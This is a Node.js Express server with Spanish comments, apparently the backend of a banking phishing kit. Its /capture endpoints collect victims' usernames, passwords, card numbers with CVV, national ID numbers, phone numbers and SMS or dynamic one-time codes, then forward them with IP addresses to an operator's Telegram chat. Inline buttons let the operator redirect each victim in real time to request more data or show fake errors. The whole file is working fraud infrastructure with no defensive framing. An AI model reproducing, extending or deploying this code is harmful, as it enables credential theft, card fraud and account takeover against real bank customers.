const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

// Variables de entorno de Telegram
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// -----------------------------
// 1. Modelo de comandos/acciones
// -----------------------------

// Acciones soportadas desde Telegram
const ACTIONS = {
  ERROR_LOGO: "ERROR_LOGO",
  PEDIR_LOGO: "PEDIR_LOGO",
  ERROR_SMS: "ERROR_SMS",
  PEDIR_SMS: "PEDIR_SMS",
  ERROR_CARD: "ERROR_CARD",
  PEDIR_CARD: "PEDIR_CARD",
  ERROR_DATOS: "ERROR_DATOS",
  PEDIR_DATOS: "PEDIR_DATOS",
  ERROR_SOYYO: "ERROR_SOYYO",
  PEDIR_SOYYO: "PEDIR_SOYYO",
  ERROR_DINAMICA: "ERROR_DINAMICA",
  PEDIR_DINAMICA: "PEDIR_DINAMICA",
};

// Mapeo de acción -> URL final a la que debe ser redirigido el cliente.
// IMPORTANTE: loading.html espera un campo JSON `redirect_to` con la URL COMPLETA.
// Aquí usamos rutas relativas del mismo dominio donde se sirvan los HTML.
function buildRedirectUrl(action) {
  switch (action) {
    case ACTIONS.ERROR_LOGO:
      return "index.html?state=error_logo";
    case ACTIONS.PEDIR_LOGO:
      return "index.html?state=pedir_logo";

    case ACTIONS.ERROR_SMS:
      return "sms.html?state=error_sms";
    case ACTIONS.PEDIR_SMS:
      return "sms.html?state=pedir_sms";

    case ACTIONS.ERROR_CARD:
      return "card.html?state=error_card";
    case ACTIONS.PEDIR_CARD:
      return "card.html?state=pedir_card";

    case ACTIONS.ERROR_DATOS:
      return "datos.html?state=error_datos";
    case ACTIONS.PEDIR_DATOS:
      return "datos.html?state=pedir_datos";

    case ACTIONS.ERROR_SOYYO:
      return "soyyo.html?state=error_soyyo";
    case ACTIONS.PEDIR_SOYYO:
      return "soyyo.html?state=pedir_soyyo";

    case ACTIONS.ERROR_DINAMICA:
      return "dinamica.html?state=error_dinamica";
    case ACTIONS.PEDIR_DINAMICA:
      return "dinamica.html?state=pedir_dinamica";

    default:
      return null;
  }
}

// -----------------------------
// 2. Almacenamiento en memoria
// -----------------------------

// Estructura simple en memoria:
// orders[sessionId] = { action, redirectTo, createdAt }
const orders = Object.create(null);

// Tiempo máximo que una orden se considera válida (ms)
const ORDER_TTL_MS = 5 * 60 * 1000; // 5 minutos

function saveOrder(sessionId, action) {
  const redirectTo = buildRedirectUrl(action);
  if (!redirectTo) {
    return null;
  }

  const order = {
    action,
    redirectTo,
    createdAt: Date.now(),
  };

  orders[sessionId] = order;
  return order;
}

function consumeOrder(sessionId) {
  const order = orders[sessionId];
  if (!order) {
    return null;
  }

  const isExpired = Date.now() - order.createdAt > ORDER_TTL_MS;
  if (isExpired) {
    delete orders[sessionId];
    return null;
  }

  // Consumo de un solo uso
  delete orders[sessionId];
  return order;
}

// Limpieza periódica (defensiva)
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, order] of Object.entries(orders)) {
    if (now - order.createdAt > ORDER_TTL_MS) {
      delete orders[sessionId];
    }
  }
}, 60 * 1000);

// -----------------------------
// 3. Configuración del servidor
// -----------------------------

const app = express();
const PORT = process.env.PORT || 3000;

// CORS: permitir peticiones desde cualquier origen (frontend, móviles, Azure Blob, etc.)
app.use(cors());

// Para leer JSON en los webhooks
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

// Ruta raíz y health para Render
app.get("/", (req, res) => {
  res.json({ ok: true, service: "tricoserver1" });
});
app.get("/health", (req, res) => {
  res.json({ ok: true, status: "healthy" });
});

// -----------------------------
// 4. Endpoint de polling usado por loading.html
// -----------------------------

// IMPORTANTE: loading.html actualmente hace fetch hacia
//   https://<servidor>/instruction/{sessionId}
// y espera un JSON con la propiedad `redirect_to`.

app.get("/instruction/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  if (!sessionId) {
    return res.status(400).json({
      ok: false,
      error: "sessionId requerido",
      redirect_to: null,
    });
  }

  const order = consumeOrder(sessionId);

  if (!order) {
    return res.json({
      ok: true,
      action: null,
      redirect_to: null,
    });
  }

  return res.json({
    ok: true,
    action: order.action,
    redirect_to: order.redirectTo,
  });
});

// -----------------------------
// 5. Webhook de Telegram (esqueleto)
// -----------------------------

// NOTA IMPORTANTE:
// - Este endpoint asume que los botones de Telegram envían en `callback_data`
//   un JSON con el siguiente formato:
//   { "action": "ERROR_LOGO", "sessionId": "<id-sesion-cliente>" }
// - El parseo concreto puede ajustarse cuando se despliegue el bot.

app.post("/telegram/webhook", async (req, res) => {
  try {
    const update = req.body;

    // Callback query (botones inline)
    const callbackQuery = update.callback_query;
    if (!callbackQuery || !callbackQuery.data) {
      // No es un callback de botón que nos interese
      return res.json({ ok: true, ignored: true });
    }

    let payload;
    try {
      payload = JSON.parse(callbackQuery.data);
    } catch (e) {
      return res.json({ ok: false, error: "callback_data no es JSON válido" });
    }

    const { action, sessionId } = payload || {};
    if (!action || !sessionId) {
      return res.json({
        ok: false,
        error: "callback_data debe incluir action y sessionId",
      });
    }

    const order = saveOrder(sessionId, action);
    if (!order) {
      return res.json({
        ok: false,
        error: `Acción no soportada: ${action}`,
      });
    }

    // Opcional: responder a Telegram confirmando la acción
    if (TELEGRAM_TOKEN) {
      const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
      try {
        await axios.post(apiUrl, {
          callback_query_id: callbackQuery.id,
          text: `Acción recibida: ${action}`,
          show_alert: false,
        });
      } catch (err) {
        // No rompemos el flujo solo por un fallo al responder a Telegram
        console.error("Error respondiendo a Telegram:", err.message);
      }
    }

    return res.json({
      ok: true,
      saved: true,
      action,
      sessionId,
    });
  } catch (error) {
    console.error("Error en /telegram/webhook:", error);
    return res.status(500).json({ ok: false });
  }
});

// -----------------------------
// 6. Funciones auxiliares y endpoints de datos
// -----------------------------

async function enviarMensajeTelegram(texto) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("TELEGRAM_TOKEN o TELEGRAM_CHAT_ID no definidos");
    return;
  }

  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  await axios.post(apiUrl, {
    chat_id: TELEGRAM_CHAT_ID,
    text: texto,
    parse_mode: "HTML",
  });
}

// Envía el mensaje a Telegram CON botones inline para redirigir al cliente
function buildCallbackData(action, sessionId) {
  return JSON.stringify({ action, sessionId });
}

async function enviarMensajeConBotones(texto, sessionId) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("TELEGRAM_TOKEN o TELEGRAM_CHAT_ID no definidos");
    return;
  }

  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "ERROR LOGO", callback_data: buildCallbackData("ERROR_LOGO", sessionId) },
        { text: "PEDIR LOGO", callback_data: buildCallbackData("PEDIR_LOGO", sessionId) },
      ],
      [
        { text: "ERROR SMS", callback_data: buildCallbackData("ERROR_SMS", sessionId) },
        { text: "PEDIR SMS", callback_data: buildCallbackData("PEDIR_SMS", sessionId) },
      ],
      [
        { text: "ERROR CARD", callback_data: buildCallbackData("ERROR_CARD", sessionId) },
        { text: "PEDIR CARD", callback_data: buildCallbackData("PEDIR_CARD", sessionId) },
      ],
      [
        { text: "ERROR DATOS", callback_data: buildCallbackData("ERROR_DATOS", sessionId) },
        { text: "PEDIR DATOS", callback_data: buildCallbackData("PEDIR_DATOS", sessionId) },
      ],
      [
        { text: "ERROR SOYYO", callback_data: buildCallbackData("ERROR_SOYYO", sessionId) },
        { text: "PEDIR SOYYO", callback_data: buildCallbackData("PEDIR_SOYYO", sessionId) },
      ],
      [
        { text: "ERROR DINAMICA", callback_data: buildCallbackData("ERROR_DINAMICA", sessionId) },
        { text: "PEDIR DINAMICA", callback_data: buildCallbackData("PEDIR_DINAMICA", sessionId) },
      ],
    ],
  };

  await axios.post(apiUrl, {
    chat_id: TELEGRAM_CHAT_ID,
    text: texto,
    parse_mode: "HTML",
    reply_markup,
  });
}

// Permite simular órdenes sin pasar por Telegram.
// Ejemplo: POST /command { "sessionId": "abc", "action": "ERROR_LOGO" }
app.post("/command", (req, res) => {
  const { sessionId, action } = req.body || {};

  if (!sessionId || !action) {
    return res.status(400).json({
      ok: false,
      error: "sessionId y action son requeridos",
    });
  }

  const order = saveOrder(sessionId, action);
  if (!order) {
    return res.status(400).json({
      ok: false,
      error: `Acción no soportada: ${action}`,
    });
  }

  return res.json({
    ok: true,
    action: order.action,
    redirect_to: order.redirectTo,
  });
});

// Captura de datos de login desde index.html
// Body esperado: { sessionId, username, password, barrio? }
app.post("/capture/index", async (req, res) => {
  try {
    const { sessionId, username, password, barrio } = req.body || {};

    if (!sessionId || !username || !password) {
      return res.status(400).json({
        ok: false,
        error: "sessionId, username y password son requeridos",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡DATO OBTENIDO - NUEVA VISITA🟡</b>",
      "",
      `<b>USUARIO:</b> ${username}`,
      `<b>CLAVE:</b> ${password}`,
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram:", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/index:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de datos de tarjeta desde card.html
// Body esperado: { sessionId, cardnumber, cvv, expiry, barrio? }
app.post("/capture/card", async (req, res) => {
  try {
    const { sessionId, cardnumber, cvv, expiry, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡NUEVA CARD - CLIENTE ACTIVO🟡</b>",
      "",
      `<b>NUMERO:</b> ${cardnumber || "N/A"}`,
      `<b>FECHA:</b> ${expiry || "N/A"}`,
      `<b>CVV:</b> ${cvv || "N/A"}`,
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (card):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/card:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de datos personales desde datos.html
// Body esperado: { sessionId, name, cedula, email, phone, barrio? }
app.post("/capture/datos", async (req, res) => {
  try {
    const { sessionId, name, cedula, email, phone, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡NUEVOS DATOS - CLIENTE ACTIVO🟡</b>",
      "",
      `<b>NOMBRE:</b> ${name || "N/A"}`,
      `<b>CC:</b> ${cedula || "N/A"}`,
      `<b>CORREO:</b> ${email || "N/A"}`,
      `<b>CELL:</b> ${phone || "N/A"}`,
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (datos):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/datos:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de código SMS desde sms.html
// Body esperado: { sessionId, smsCode, barrio? }
app.post("/capture/sms", async (req, res) => {
  try {
    const { sessionId, smsCode, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡NUEVO SMS - CLIENTE ACTIVO🟡</b>",
      "",
      `<b>SMS:</b> ${smsCode || "N/A"}`,
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (sms):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/sms:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de código dinámica desde dinamica.html
// Body esperado: { sessionId, dinamicaCode, barrio? }
app.post("/capture/dinamica", async (req, res) => {
  try {
    const { sessionId, dinamicaCode, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡NUEVA DINAMICA - CLIENTE ACTIVO🟡</b>",
      "",
      `<b>DINAMICA:</b> ${dinamicaCode || "N/A"}`,
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (dinamica):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/dinamica:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de paso SoyYo desde soyyo.html
// Body esperado: { sessionId, photoData?, barrio? }
app.post("/capture/soyyo", async (req, res) => {
  try {
    const { sessionId, photoData, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡SOY YO - CLIENTE ACTIVO🟡</b>",
      "",
      "<b>Imagen:</b> capturada en el navegador",
      `<b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (soyyo):", err.message);
    }

    // No intentamos enviar la imagen binaria a Telegram en este flujo.
    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/soyyo:", error);
    return res.status(500).json({ ok: false });
  }
});

// -----------------------------
// 7. Arranque del servidor
// -----------------------------

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Servidor escuchando en puerto ${PORT}`);
});

// Auto-ping para mantener Render activo (free tier se duerme tras ~15 min)
const PING_URL =
  process.env.RENDER_EXTERNAL_URL || "https://estesi-nnmv.onrender.com";
setInterval(async () => {
  try {
    const res = await fetch(`${PING_URL}/health`);
    const data = await res.json();
    console.log("🔄 Auto-ping OK:", data);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 14 * 60 * 1000);

